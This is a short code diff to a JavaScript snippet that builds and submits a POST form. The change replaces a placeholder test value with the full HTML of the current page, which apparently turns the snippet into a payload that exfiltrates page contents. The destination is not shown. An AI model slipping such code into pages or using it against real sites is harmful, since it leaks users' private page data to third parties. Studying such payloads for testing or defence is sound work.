@@ -5,7 +5,7 @@ form.method = "POST";
 
 const input = document.createElement("input");
 input.name = "data";
-input.value = "works";
+input.value = document.documentElement.innerHTML;
 
 form.appendChild(input);
 document.body.appendChild(form);
